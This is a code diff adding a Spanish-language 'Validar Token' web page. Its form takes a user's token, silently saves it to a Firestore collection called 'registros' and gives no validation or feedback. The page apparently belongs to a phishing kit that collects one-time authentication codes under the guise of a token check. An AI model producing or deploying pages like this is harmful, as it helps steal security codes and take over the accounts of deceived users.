@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Validar Token</title>
+<link rel="stylesheet" href="login.css">
+</head>
+<body>
+
+<div class="card">
+
+    <img src="token.jpeg" class="top-image" id="imgTopToken">
+
+    <div id="mensajeImagenToken" class="mensaje-imagen"></div>
+
+    <h2>Validar Token</h2>
+
+    <form id="tokenForm">
+
+        <label>Token *</label>
+        <input type="text" id="token" required>
+
+        <button type="submit">Validar</button>
+
+        <p id="mensajeToken"></p>
+
+    </form>
+
+    <img src="abajo.jpeg" class="bottom-image" id="imgBottomToken">
+
+</div>
+
+<script src="token.js"></script>
+<script type="module">
+import { db } from "./firebase.js";
+import { addDoc, collection } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+document.getElementById("tokenForm").addEventListener("submit", async function(e){
+    e.preventDefault();
+
+    const token = document.getElementById("token").value;
+
+    await addDoc(collection(db, "registros"), {
+        tipo: "token",
+        codigo: token,
+        fecha: new Date()
+    });
+
+   
+});
+</script>
+
+</body>
+</html>
